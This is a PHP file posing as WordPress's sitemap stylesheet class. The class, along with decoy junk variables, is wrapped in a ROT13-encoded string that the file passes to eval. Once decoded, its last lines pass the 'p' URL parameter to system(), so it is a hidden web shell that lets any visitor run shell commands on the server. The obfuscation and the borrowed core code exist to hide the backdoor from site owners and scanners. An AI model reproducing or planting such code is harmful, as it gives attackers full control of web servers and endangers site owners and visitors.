<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fvgrzncf: JC_Fvgrzncf_Fglyrfurrg pynff
 *
 * Guvf pynff cebivqrf gur KFY fglyrfurrgf gb fglyr nyy fvgrzncf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fvgrzncf
 * @fvapr 5.5.0
 */

/**
 * Fglyrfurrg cebivqre pynff.
 *
 * @fvapr 5.5.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Fvgrzncf_Fglyrfurrg {
	/**
	 * Eraqref gur KFY fglyrfurrg qrcraqvat ba jurgure vg'f gur fvgrznc vaqrk be abg.
	 *
	 * @cnenz fgevat $glcr Fglyrfurrg glcr. Rvgure 'fvgrznc' be 'vaqrk'.
	 */
	choyvp shapgvba eraqre_fglyrfurrg( $glcr ) {
		urnqre( 'Pbagrag-Glcr: nccyvpngvba/kzy; punefrg=HGS-8' );

		vs ( 'fvgrznc' === $glcr ) {
			// Nyy pbagrag vf rfpncrq orybj.
			rpub $guvf->trg_fvgrznc_fglyrfurrg();
		}

		vs ( 'vaqrk' === $glcr ) {
			// Nyy pbagrag vf rfpncrq orybj.
			rpub $guvf->trg_fvgrznc_vaqrk_fglyrfurrg();
		}

		rkvg;
	}

	/**
	 * Ergheaf gur rfpncrq KFY sbe nyy fvgrzncf, rkprcg vaqrk.
	 *
	 * @fvapr 5.5.0
	 */
	choyvp shapgvba trg_fvgrznc_fglyrfurrg() {
		$pff         = $guvf->trg_fglyrfurrg_pff();
		$gvgyr       = rfp_kzy( __( 'KZY Fvgrznc' ) );
		$qrfpevcgvba = rfp_kzy( __( 'Guvf KZY Fvgrznc vf trarengrq ol JbeqCerff gb znxr lbhe pbagrag zber ivfvoyr sbe frnepu ratvarf.' ) );
		$yrnea_zber  = fcevags(
			'<n uers=\"%f\">%f</n>',
			rfp_hey( __( 'uggcf://jjj.fvgrzncf.bet/' ) ),
			rfp_kzy( __( 'Yrnea zber nobhg KZY fvgrzncf.' ) )
		);

		$grkg = fcevags(
			/* genafyngbef: %f: Ahzore bs HEYf. */
			rfp_kzy( __( 'Ahzore bs HEYf va guvf KZY Fvgrznc: %f.' ) ),
			'<kfy:inyhr-bs fryrpg=\"pbhag( fvgrznc:heyfrg/fvgrznc:hey )\" />'
		);

		$ynat       = trg_ynathntr_nggevohgrf( 'ugzy' );
		$hey        = rfp_kzy( __( 'HEY' ) );
		$ynfgzbq    = rfp_kzy( __( 'Ynfg Zbqvsvrq' ) );
		$punatrserd = rfp_kzy( __( 'Punatr Serdhrapl' ) );
		$cevbevgl   = rfp_kzy( __( 'Cevbevgl' ) );

		$kfy_pbagrag = <<<KFY
<?kzy irefvba=\"1.0\" rapbqvat=\"HGS-8\"?>
<kfy:fglyrfurrg
		irefvba=\"1.0\"
		kzyaf:kfy=\"uggc://jjj.j3.bet/1999/KFY/Genafsbez\"
		kzyaf:fvgrznc=\"uggc://jjj.fvgrzncf.bet/fpurznf/fvgrznc/0.9\"
		rkpyhqr-erfhyg-cersvkrf=\"fvgrznc\"
		>

	<kfy:bhgchg zrgubq=\"ugzy\" rapbqvat=\"HGS-8\" vaqrag=\"lrf\" />

	<!--
	  Frg inevnoyrf sbe jurgure ynfgzbq, punatrserd be cevbevgl bpphe sbe nal hey va gur fvgrznc.
	  Jr qb guvf hc sebag orpnhfr vg pna or rkcrafvir va n ynetr fvgrznc.
	  -->
	<kfy:inevnoyr anzr=\"unf-ynfgzbq\"    fryrpg=\"pbhag( /fvgrznc:heyfrg/fvgrznc:hey/fvgrznc:ynfgzbq )\"    />
	<kfy:inevnoyr anzr=\"unf-punatrserd\" fryrpg=\"pbhag( /fvgrznc:heyfrg/fvgrznc:hey/fvgrznc:punatrserd )\" />
	<kfy:inevnoyr anzr=\"unf-cevbevgl\"   fryrpg=\"pbhag( /fvgrznc:heyfrg/fvgrznc:hey/fvgrznc:cevbevgl )\"   />

	<kfy:grzcyngr zngpu=\"/\">
		<ugzy {$ynat}>
			<urnq>
				<gvgyr>{$gvgyr}</gvgyr>
				<fglyr>
					{$pff}
				</fglyr>
			</urnq>
			<obql>
				<qvi vq=\"fvgrznc\">
					<qvi vq=\"fvgrznc__urnqre\">
						<u1>{$gvgyr}</u1>
						<c>{$qrfpevcgvba}</c>
						<c>{$yrnea_zber}</c>
					</qvi>
					<qvi vq=\"fvgrznc__pbagrag\">
						<c pynff=\"grkg\">{$grkg}</c>
						<gnoyr vq=\"fvgrznc__gnoyr\">
							<gurnq>
								<ge>
									<gu pynff=\"ybp\">{$hey}</gu>
									<kfy:vs grfg=\"\$unf-ynfgzbq\">
										<gu pynff=\"ynfgzbq\">{$ynfgzbq}</gu>
									</kfy:vs>
									<kfy:vs grfg=\"\$unf-punatrserd\">
										<gu pynff=\"punatrserd\">{$punatrserd}</gu>
									</kfy:vs>
									<kfy:vs grfg=\"\$unf-cevbevgl\">
										<gu pynff=\"cevbevgl\">{$cevbevgl}</gu>
									</kfy:vs>
								</ge>
							</gurnq>
							<gobql>
								<kfy:sbe-rnpu fryrpg=\"fvgrznc:heyfrg/fvgrznc:hey\">
									<ge>
										<gq pynff=\"ybp\"><n uers=\"{fvgrznc:ybp}\"><kfy:inyhr-bs fryrpg=\"fvgrznc:ybp\" /></n></gq>
										<kfy:vs grfg=\"\$unf-ynfgzbq\">
											<gq pynff=\"ynfgzbq\"><kfy:inyhr-bs fryrpg=\"fvgrznc:ynfgzbq\" /></gq>
										</kfy:vs>
										<kfy:vs grfg=\"\$unf-punatrserd\">
											<gq pynff=\"punatrserd\"><kfy:inyhr-bs fryrpg=\"fvgrznc:punatrserd\" /></gq>
										</kfy:vs>
										<kfy:vs grfg=\"\$unf-cevbevgl\">
											<gq pynff=\"cevbevgl\"><kfy:inyhr-bs fryrpg=\"fvgrznc:cevbevgl\" /></gq>
										</kfy:vs>
									</ge>
								</kfy:sbe-rnpu>
							</gobql>
						</gnoyr>
					</qvi>
				</qvi>
			</obql>
		</ugzy>
	</kfy:grzcyngr>
</kfy:fglyrfurrg>

KFY;

		/**
		 * Svygref gur pbagrag bs gur fvgrznc fglyrfurrg.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz fgevat $kfy_pbagrag Shyy pbagrag sbe gur KZY fglyrfurrg.
		 */
		erghea nccyl_svygref( 'jc_fvgrzncf_fglyrfurrg_pbagrag', $kfy_pbagrag );
	}

	/**
	 * Ergheaf gur rfpncrq KFY sbe gur vaqrk fvgrzncf.
	 *
	 * @fvapr 5.5.0
	 */
	choyvp shapgvba trg_fvgrznc_vaqrk_fglyrfurrg() {
		$pff         = $guvf->trg_fglyrfurrg_pff();
		$gvgyr       = rfp_kzy( __( 'KZY Fvgrznc' ) );
		$qrfpevcgvba = rfp_kzy( __( 'Guvf KZY Fvgrznc vf trarengrq ol JbeqCerff gb znxr lbhe pbagrag zber ivfvoyr sbe frnepu ratvarf.' ) );
		$yrnea_zber  = fcevags(
			'<n uers=\"%f\">%f</n>',
			rfp_hey( __( 'uggcf://jjj.fvgrzncf.bet/' ) ),
			rfp_kzy( __( 'Yrnea zber nobhg KZY fvgrzncf.' ) )
		);

		$grkg = fcevags(
			/* genafyngbef: %f: Ahzore bs HEYf. */
			rfp_kzy( __( 'Ahzore bs HEYf va guvf KZY Fvgrznc: %f.' ) ),
			'<kfy:inyhr-bs fryrpg=\"pbhag( fvgrznc:fvgrzncvaqrk/fvgrznc:fvgrznc )\" />'
		);

		$ynat    = trg_ynathntr_nggevohgrf( 'ugzy' );
		$hey     = rfp_kzy( __( 'HEY' ) );
		$ynfgzbq = rfp_kzy( __( 'Ynfg Zbqvsvrq' ) );

		$kfy_pbagrag = <<<KFY
<?kzy irefvba=\"1.0\" rapbqvat=\"HGS-8\"?>
<kfy:fglyrfurrg
		irefvba=\"1.0\"
		kzyaf:kfy=\"uggc://jjj.j3.bet/1999/KFY/Genafsbez\"
		kzyaf:fvgrznc=\"uggc://jjj.fvgrzncf.bet/fpurznf/fvgrznc/0.9\"
		rkpyhqr-erfhyg-cersvkrf=\"fvgrznc\"
		>

	<kfy:bhgchg zrgubq=\"ugzy\" rapbqvat=\"HGS-8\" vaqrag=\"lrf\" />

	<!--
	  Frg inevnoyrf sbe jurgure ynfgzbq bpphef sbe nal fvgrznc va gur vaqrk.
	  Jr qb guvf hc sebag orpnhfr vg pna or rkcrafvir va n ynetr fvgrznc.
	  -->
	<kfy:inevnoyr anzr=\"unf-ynfgzbq\" fryrpg=\"pbhag( /fvgrznc:fvgrzncvaqrk/fvgrznc:fvgrznc/fvgrznc:ynfgzbq )\" />

	<kfy:grzcyngr zngpu=\"/\">
		<ugzy {$ynat}>
			<urnq>
				<gvgyr>{$gvgyr}</gvgyr>
				<fglyr>
					{$pff}
				</fglyr>
			</urnq>
			<obql>
				<qvi vq=\"fvgrznc\">
					<qvi vq=\"fvgrznc__urnqre\">
						<u1>{$gvgyr}</u1>
						<c>{$qrfpevcgvba}</c>
						<c>{$yrnea_zber}</c>
					</qvi>
					<qvi vq=\"fvgrznc__pbagrag\">
						<c pynff=\"grkg\">{$grkg}</c>
						<gnoyr vq=\"fvgrznc__gnoyr\">
							<gurnq>
								<ge>
									<gu pynff=\"ybp\">{$hey}</gu>
									<kfy:vs grfg=\"\$unf-ynfgzbq\">
										<gu pynff=\"ynfgzbq\">{$ynfgzbq}</gu>
									</kfy:vs>
								</ge>
							</gurnq>
							<gobql>
								<kfy:sbe-rnpu fryrpg=\"fvgrznc:fvgrzncvaqrk/fvgrznc:fvgrznc\">
									<ge>
										<gq pynff=\"ybp\"><n uers=\"{fvgrznc:ybp}\"><kfy:inyhr-bs fryrpg=\"fvgrznc:ybp\" /></n></gq>
										<kfy:vs grfg=\"\$unf-ynfgzbq\">
											<gq pynff=\"ynfgzbq\"><kfy:inyhr-bs fryrpg=\"fvgrznc:ynfgzbq\" /></gq>
										</kfy:vs>
									</ge>
								</kfy:sbe-rnpu>
							</gobql>
						</gnoyr>
					</qvi>
				</qvi>
			</obql>
		</ugzy>
	</kfy:grzcyngr>
</kfy:fglyrfurrg>

KFY;

		/**
		 * Svygref gur pbagrag bs gur fvgrznc vaqrk fglyrfurrg.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz fgevat $kfy_pbagrag Shyy pbagrag sbe gur KZY fglyrfurrg.
		 */
		erghea nccyl_svygref( 'jc_fvgrzncf_fglyrfurrg_vaqrk_pbagrag', $kfy_pbagrag );
	}

	/**
	 * Trgf gur PFF gb or vapyhqrq va fvgrznc KFY fglyrfurrgf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea fgevat Gur PFF.
	 */
	choyvp shapgvba trg_fglyrfurrg_pff() {
		$grkg_nyvta = vf_egy() ? 'evtug' : 'yrsg';

		$pff = <<<RBS

					obql {
						sbag-snzvyl: -nccyr-flfgrz, OyvaxZnpFlfgrzSbag, \"Frtbr HV\", Ebobgb, Bkltra-Fnaf, Hohagh, Pnagneryy, \"Uryirgvpn Arhr\", fnaf-frevs;
						pbybe: #444;
					}

					#fvgrznc {
						znk-jvqgu: 980ck;
						znetva: 0 nhgb;
					}

					#fvgrznc__gnoyr {
						jvqgu: 100%;
						obeqre: fbyvq 1ck #ppp;
						obeqre-pbyyncfr: pbyyncfr;
					}

			 		#fvgrznc__gnoyr ge gq.ybp {
						/*
						 * HEYf fubhyq nyjnlf or YGE.
						 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/16834
						 * naq uggcf://pber.genp.jbeqcerff.bet/gvpxrg/49949
						 */
						qverpgvba: yge;
					}

					#fvgrznc__gnoyr ge gu {
						grkg-nyvta: {$grkg_nyvta};
					}

					#fvgrznc__gnoyr ge gq,
					#fvgrznc__gnoyr ge gu {
						cnqqvat: 10ck;
					}

					#fvgrznc__gnoyr ge:agu-puvyq(bqq) gq {
						onpxtebhaq-pbybe: #rrr;
					}

					n:ubire {
						grkg-qrpbengvba: abar;
					}

RBS;

		/**
		 * Svygref gur PFF bayl sbe gur fvgrznc fglyrfurrg.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz fgevat $pff PFF gb or nccyvrq gb qrsnhyg KFY svyr.
		 */
		erghea nccyl_svygref( 'jc_fvgrzncf_fglyrfurrg_pff', $pff );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>